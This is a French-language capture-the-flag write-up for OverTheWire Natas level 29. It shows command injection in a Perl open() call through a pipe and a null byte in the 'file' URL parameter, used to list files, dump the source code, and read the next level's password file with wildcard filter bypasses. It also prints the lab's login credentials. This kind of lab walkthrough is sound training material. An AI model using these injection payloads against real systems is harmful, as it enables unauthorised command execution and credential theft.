## Connexion (username=natas29 password=hwgoYUiGWoSZAqphtCAZf7u1jS16KEah)
```
http://natas29.natas.labs.overthewire.org/
```

## Recherche du mot de passe
En cherchant les injections perl j'ai appris que les pipes (|) permettent d'exécuter des codes dans les commandes fopen(my_file) en perl.

J'ai essayé quelques trucs pour modifier le paramèetre file, et j'ai identifié celle ci:
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
Output:
```
index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
```
Donc la commande doit se terminer par un caractère NULL.

http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00

Le fichier est difficilement lisible mais donne un truc comme ça:
```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

On peut utiliser les wildcards de cat (* ou ?) qui va trouvé intelligemment le fichier sans écrire explicitement natas.


http://natas29.natas.labs.overthewire.org/?file=|cat%20../../../../etc/na?as_webpass/na?as30%00

## Prochain mot de passe
```
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```